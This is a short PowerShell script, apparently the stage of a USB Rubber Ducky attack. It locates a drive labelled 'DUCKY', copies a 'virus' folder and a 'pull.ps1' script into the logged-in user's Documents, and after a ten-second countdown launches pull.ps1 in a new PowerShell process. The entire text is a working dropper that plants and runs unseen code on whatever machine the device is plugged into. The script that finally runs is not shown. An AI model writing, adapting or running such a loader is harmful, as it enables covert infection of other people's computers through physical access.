
$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
$localUsername = $env:USERNAME
New-Item -Path "C:\Users\$localUsername\Documents" -Name 'virus' -ItemType "directory"
New-Item -Path "C:\Users\$localUsername\Documents\virus" -Name 'Virus' -ItemType "directory"
$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\virus" -Recurse -Filter "pull.ps1"

$pathBeforeCopy = Get-ChildItem -Path "$driveLetter\" -Directory -Recurse -Filter "virus"
$pathAfterCopy = "C:\Users\$localUsername\Documents\virus"

Copy-Item -Path $pathBeforeCopy -Destination $pathAfterCopy -Recurse
Copy-Item -Path $pullPathBeforeCopy -Destination $pathAfterCopy\Virus

$time_in_seconds = 10
while ($time_in_seconds -gt 0) {
    #Write-Host "Time remaining: $seconds"
    Start-Sleep -Seconds 1
    $time_in_seconds--
}
Start-Process powershell -ArgumentList "-File", "$pathAfterCopy\Virus\pull.ps1"

exit
